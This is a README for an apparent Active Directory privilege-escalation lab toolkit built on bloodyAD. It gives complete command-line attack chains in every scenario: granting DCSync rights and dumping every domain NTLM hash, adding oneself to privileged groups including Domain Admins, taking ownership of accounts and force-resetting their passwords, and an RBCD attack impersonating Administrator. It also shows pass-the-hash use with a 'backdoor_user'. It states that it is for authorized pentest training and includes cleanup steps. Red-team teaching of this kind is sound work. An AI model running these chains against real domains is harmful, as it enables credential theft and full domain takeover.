# adpwn-tools — AD Privilege Escalation Learning Lab

A teaching toolkit for learning Active Directory privilege escalation through ACL abuse.
Built around bloodyAD LDAP primitives with a guided, recon-to-exploit narrative.

> **For authorized penetration testing and red team training only.**

---

## What This Is

Active Directory stores not just users and computers but also a permission layer called
**Access Control Lists (ACLs)**. Every AD object — a user, group, computer, even the
domain root itself — has a DACL (Discretionary ACL) listing who is allowed to do what
to it. These permissions are often misconfigured in real environments, and abusing them
is one of the most common and reliable paths to Domain Admin.

This toolkit gives you hands-on experience with the most impactful ACL primitives:
reading them (BloodHound), understanding what they mean, and exploiting them safely in
a lab — with automatic cleanup so you can reset and repeat.

---

## Files

- `adpwn_tools.py` -- Core async wrappers around the adpwn Python API. LDAP manipulation and restore journaling.
- `bloodyad_tool.py` -- Subprocess wrappers around the bloodyAD CLI for enumeration.
- `autobloody_tool.py` -- Wrapper around autobloody for graph-driven ACL path exploitation via BloodHound and Neo4j.
- `adpwn_cli.py` -- Argparse CLI for standalone use; wraps all 9 primitives with consistent flags.

---

## Lab Setup

You need a Windows AD environment to practice against. Two options that work well:

**GOAD (Game of Active Directory)** — a Vagrant/Ansible lab with multiple domains, pre-seeded
with intentional misconfigurations. Good for realistic multi-domain scenarios.

```
git clone https://github.com/Orange-Cyberdefense/GOAD
cd GOAD && vagrant up
```

**DetectionLab** — Windows Server + workstations with logging pre-configured. Good if you
also want to practice detection and evasion.

Once your lab is running, install BloodHound on your attack machine. BloodHound is the
primary reconnaissance tool — it maps every trust and ACL edge in the domain and shows
you exactly which path leads to Domain Admin.

---

## Installation

### 1. Clone

```
git clone https://github.com/eriakort/adpwn-tools
cd adpwn-tools
```

### 2. Install dependencies

```
pip install bloodyad autobloody impacket
```

### 3. Set up the adpwn package

The scripts depend on a vendored adpwn package placed one level above this repo:

```
parent_dir/
  adpwn/           <- vendored package (primitives, pathfinding, restore)
  adpwn-tools/     <- this repo
```

### 4. Integrate with pentestmcp (optional)

Copy `adpwn_tools.py` and `bloodyad_tool.py` into your `pentestmcp/tools/` directory
to expose them as MCP tools.

---

## Prerequisites

Before working through the attack scenarios below, you should be comfortable with:

- Basic AD concepts: what users, groups, OUs, and GPOs are
- What LDAP is (the protocol AD uses internally)
- How NTLM authentication works (hashes, pass-the-hash)
- Reading BloodHound graphs

You do not need to be an expert — the explanations below are written to build your
understanding as you go.

---

## The Learning Path

### Phase 1 — Recon: Finding ACL Misconfigurations with BloodHound

BloodHound is the starting point for every AD engagement. It ingests data collected by
SharpHound (Windows) or bloodhound-python (Linux) and draws a graph of every relationship
in the domain — including dangerous ACL edges that are invisible in normal AD tooling.

**Collect domain data from Linux:**

```bash
bloodhound-python -d corp.local -u lowpriv -p Password123 \
  -c All -ns 10.10.11.100
```

**Collect from a Windows foothold:**

```cmd
SharpHound.exe -c All --zipfilename bloodhound.zip
```

Load the ZIP into BloodHound. Then run these built-in queries:

- *Find Shortest Paths to Domain Admins* — the most important one
- *Find Principals with DCSync Rights*
- *Find All Paths from Domain Users to High Value Targets*

BloodHound will draw edges between objects. The edges you are looking for are:

| BloodHound Edge   | What it means                                       |
|-------------------|-----------------------------------------------------|
| WriteDacl         | You can write any ACE to the target object's DACL   |
| WriteOwner        | You can change who owns the target object           |
| GenericAll        | Full control over the object                        |
| GenericWrite      | Can modify most object attributes                   |
| AddMember         | Can add principals to a group                       |
| ForceChangePassword | Can reset the target user's password without knowing current |

Each of the following scenarios maps to one of these edges.

---

### Phase 2 — Exploitation

#### Scenario A: You have WriteDacl on the domain root → DCSync

**What you found in BloodHound:**
Your compromised user has a `WriteDacl` edge to the domain root object
(e.g., `CORP.LOCAL`).

**What it means:**
You can write any ACE (Access Control Entry) to the domain root's DACL. The most
powerful ACEs you can add are the two that grant DCSync rights:
DS-Replication-Get-Changes and DS-Replication-Get-Changes-All. With those in place,
you can impersonate a Domain Controller and pull every NTLM hash in the domain.

**Exploit it:**

```bash
python adpwn_cli.py dcsync \
  --host 10.10.11.100 \
  --domain corp.local \
  --user lowpriv \
  --password Password123 \
  --trustee lowpriv
```

**What happens under the hood:**
The tool sends an LDAP modify to the domain root object, appending two ACEs granting
the trustee the `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`
extended rights. These are the exact rights Domain Controllers use to replicate from
each other — which is what makes DCSync work.

**What this leads to:**
You can now dump all domain hashes using secretsdump:

```bash
secretsdump.py corp.local/lowpriv:Password123@10.10.11.100 -just-dc-ntlm
```

From the output, grab the Administrator hash and use pass-the-hash to log in:

```bash
evil-winrm -i 10.10.11.100 -u Administrator -H NTHASH
```

**MITRE ATT&CK:** T1003.006 (DCSync) → T1550 (Pass-the-Hash)

**Cleanup:**

```bash
python adpwn_cli.py restore \
  --host 10.10.11.100 \
  --domain corp.local \
  --user lowpriv \
  --password Password123 \
  --file /tmp/adpwn-TIMESTAMP.restore
```

---

#### Scenario B: You have WriteDacl on a high-value group → Add yourself

**What you found in BloodHound:**
Your user has `WriteDacl` on a group like `IT Admins` or `Server Operators`.

**What it means:**
You can grant yourself the `AddMember` right on that group, then add any principal to it.

**Exploit it — Step 1, grant AddMember right:**

```bash
python adpwn_cli.py addmember-priv \
  --host 10.10.11.100 \
  --domain corp.local \
  --user lowpriv \
  --password Password123 \
  --target "IT Admins" \
  --trustee lowpriv
```

**Exploit it — Step 2, add yourself:**

```bash
python adpwn_cli.py add-member \
  --host 10.10.11.100 \
  --domain corp.local \
  --user lowpriv \
  --password Password123 \
  --group "IT Admins" \
  --member lowpriv
```

**What this leads to:**
If the group has access to other systems, log in there using your existing credentials.
Re-run BloodHound after joining the group — your new group membership may open additional
paths that were not visible before.

**MITRE ATT&CK:** T1484 (Domain Policy Modification) → T1098 (Account Manipulation)

**Cleanup:**

```bash
# Remove yourself from the group first
python adpwn_cli.py remove-member \
  --host 10.10.11.100 \
  --domain corp.local \
  --user lowpriv \
  --password Password123 \
  --group "IT Admins" \
  --member lowpriv

# Then restore the DACL change
python adpwn_cli.py restore \
  --host 10.10.11.100 \
  --domain corp.local \
  --user lowpriv \
  --password Password123 \
  --file /tmp/adpwn-TIMESTAMP.restore
```

---

#### Scenario C: You have WriteOwner on a user or group → Takeover chain

**What you found in BloodHound:**
Your user has a `WriteOwner` edge on a target object — a user account or group.

**What it means:**
You can change who *owns* the object. The owner of an AD object implicitly has the
ability to modify its DACL. So: change ownership to yourself → write GenericAll to
yourself → do anything with the object.

**Exploit it — three-step chain:**

```bash
# Step 1: Take ownership
python adpwn_cli.py set-owner \
  --host 10.10.11.100 \
  --domain corp.local \
  --user lowpriv \
  --password Password123 \
  --target targetuser \
  --new-owner lowpriv

# Step 2: Grant yourself GenericAll
python adpwn_cli.py generic-all \
  --host 10.10.11.100 \
  --domain corp.local \
  --user lowpriv \
  --password Password123 \
  --target targetuser \
  --trustee lowpriv

# Step 3: Reset target's password
python adpwn_cli.py set-password \
  --host 10.10.11.100 \
  --domain corp.local \
  --user lowpriv \
  --password Password123 \
  --target targetuser \
  --new-password 'Pwned2026!'
```

**What this leads to:**
You now control targetuser's credentials. Log in as them, re-run BloodHound with their
context, and look for what new paths their group memberships or rights give you.

**MITRE ATT&CK:** T1548 (Abuse Elevation Control Mechanism) → T1098 (Account Manipulation)

---

#### Scenario D: You have GenericWrite on a computer object → RBCD Attack

**What you found in BloodHound:**
Your user has `GenericWrite` on a computer object (e.g., `WEB01$`).

**What it means:**
You can write the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on the target
computer, which controls Resource-Based Constrained Delegation (RBCD). By writing
your own computer account (or any machine account you control) into that attribute, you
configure the target to trust impersonation requests from your machine.

**Exploit it:**

```bash
# You need a machine account first. If you don't have one, add one using addcomputer.py
addcomputer.py corp.local/lowpriv:Password123 -dc-host 10.10.11.100 \
  -computer-name ATTACKER$ -computer-pass AttackerPass123

# Configure RBCD
python adpwn_cli.py rbcd \
  --host 10.10.11.100 \
  --domain corp.local \
  --user lowpriv \
  --password Password123 \
  --target WEB01$ \
  --trustee ATTACKER$
```

**What this leads to:**
Request a service ticket impersonating Administrator against the target computer:

```bash
getST.py -spn cifs/WEB01.corp.local -impersonate Administrator \
  corp.local/ATTACKER$:AttackerPass123

export KRB5CCNAME=Administrator@cifs_WEB01.corp.local@CORP.LOCAL.ccache
psexec.py -k -no-pass corp.local/Administrator@WEB01.corp.local
```

**MITRE ATT&CK:** T1548 (RBCD) → T1550.003 (Pass-the-Ticket)

---

#### Scenario E: You have GenericAll on any object → Maximum control

**What you found in BloodHound:**
Your user has a `GenericAll` edge on a target.

**What it means:**
Full control. GenericAll is the combination of all other rights. In practice it means
you can do any of the above — add ACEs, change the owner, reset passwords, modify
attributes. Use it to pivot to DCSync directly if the target is the domain root.

**Exploit it (path to DCSync):**

```bash
python adpwn_cli.py generic-all \
  --host 10.10.11.100 \
  --domain corp.local \
  --user lowpriv \
  --password Password123 \
  --target "Domain Admins" \
  --trustee lowpriv

python adpwn_cli.py add-member \
  --host 10.10.11.100 \
  --domain corp.local \
  --user lowpriv \
  --password Password123 \
  --group "Domain Admins" \
  --member lowpriv
```

---

### Phase 3 — Cleanup

**Never leave an engagement without restoring the environment.** Every write primitive in
this toolkit automatically saves a restore journal. The journal records exactly what was
changed and how to reverse it. Run this at the end of every attack chain:

```bash
python adpwn_cli.py restore \
  --host 10.10.11.100 \
  --domain corp.local \
  --user lowpriv \
  --password Password123 \
  --file /tmp/adpwn-2026-01-01T12-00-00.restore
```

In a lab, call restore after each scenario so the environment is clean for the next
exercise. In a real engagement, call it as part of your post-exploitation checklist
before signing off.

---

## CLI Reference

All subcommands share the same authentication flags:

| Flag          | Required | Description                             |
|---------------|----------|-----------------------------------------|
| `--host`      | Yes      | DC IP address or hostname               |
| `--domain`    | Yes      | FQDN of the domain (e.g. corp.local)   |
| `--user`      | Yes      | Username to authenticate as             |
| `--password`  | No       | Plaintext password (omit for PtH)      |
| `--nthash`    | No       | NT hash — bare NT or LM:NT format      |

### Pass-the-Hash

All subcommands accept `--nthash` in place of `--password`:

```bash
python adpwn_cli.py dcsync \
  --host 10.10.11.100 \
  --domain corp.local \
  --user Administrator \
  --password "" \
  --nthash aad3b435b51404eeaad3b435b51404ee:NTHASH \
  --trustee backdoor_user
```

### Subcommand Reference

**generic-all** — Grant GenericAll on any AD object (WriteDacl)

```bash
python adpwn_cli.py generic-all --host HOST --domain DOMAIN --user USER \
  --password PWD --target "Domain Admins" --trustee USER
```

**dcsync** — Grant DCSync rights on the domain root

```bash
python adpwn_cli.py dcsync --host HOST --domain DOMAIN --user USER \
  --password PWD --trustee USER
```

**add-member** — Add a principal to a group

```bash
python adpwn_cli.py add-member --host HOST --domain DOMAIN --user USER \
  --password PWD --group "Domain Admins" --member USER
```

**remove-member** — Remove a principal from a group

```bash
python adpwn_cli.py remove-member --host HOST --domain DOMAIN --user USER \
  --password PWD --group "Domain Admins" --member USER
```

**set-owner** — Transfer ownership of an AD object

```bash
python adpwn_cli.py set-owner --host HOST --domain DOMAIN --user USER \
  --password PWD --target targetuser --new-owner USER
```

**set-password** — Force-reset a user's password

```bash
python adpwn_cli.py set-password --host HOST --domain DOMAIN --user USER \
  --password PWD --target targetuser --new-password 'Pwned2026!'
```

**rbcd** — Configure Resource-Based Constrained Delegation

```bash
python adpwn_cli.py rbcd --host HOST --domain DOMAIN --user USER \
  --password PWD --target VICTIM$ --trustee ATTACKER$
```

**addmember-priv** — Grant AddMember right to a trustee over a group

```bash
python adpwn_cli.py addmember-priv --host HOST --domain DOMAIN --user USER \
  --password PWD --target "IT Admins" --trustee USER
```

**restore** — Replay restore journal and undo all recorded changes

```bash
python adpwn_cli.py restore --host HOST --domain DOMAIN --user USER \
  --password PWD --file /path/to/adpwn-TIMESTAMP.restore
```

---

## What Is Happening Under the Hood

All operations are standard LDAP writes — no exploits, no shellcode. You are abusing
delegated AD permissions, which is exactly how legitimate administrators manage the
directory.

- `generic-all` writes an ACE to the target object's DACL granting the trustee GenericAll.
- `dcsync` writes two ACEs to the domain root: DS-Replication-Get-Changes and DS-Replication-Get-Changes-All.
- `add-member` / `remove-member` modify the `member` attribute of the target group object.
- `set-owner` changes the security descriptor's Owner field.
- `set-password` sends an LDAP modify on the `unicodePwd` attribute.
- `rbcd` writes the trustee SID into `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target computer.
- `addmember-priv` writes an ACE granting the trustee the AddMember right over the group.

All operations happen over standard LDAP (port 389) or LDAPS (port 636). Use Wireshark
filtering on port 389 during exercises to see exactly what gets written on the wire.
This is a powerful way to understand what the tools are actually doing.

---

## MITRE ATT&CK Mapping

| Technique                          | ID        | Functions                                     |
|------------------------------------|-----------|-----------------------------------------------|
| OS Credential Dumping: DCSync      | T1003.006 | dcsync                                        |
| Account Manipulation               | T1098     | add-member, set-password                      |
| Domain Policy Modification         | T1484     | generic-all, addmember-priv                   |
| Abuse Elevation Control Mechanism  | T1548     | rbcd                                          |
| Use Alternate Authentication Material | T1550  | all subcommands (via --nthash)                |

---

## Authentication

Accepts plaintext password or pass-the-hash (NT hash in bare or LM:NT format).
LDAPS (port 636) is used automatically when `--secure` is passed to the underlying
bloodyAD layer.

---

## Requirements

- Python 3.10+
- adpwn package vendored at `../adpwn/`
- bloodyAD and autobloody in PATH
- FastMCP / asyncio (pentestmcp, for MCP mode only)

---

For authorized penetration testing and red team engagements only.
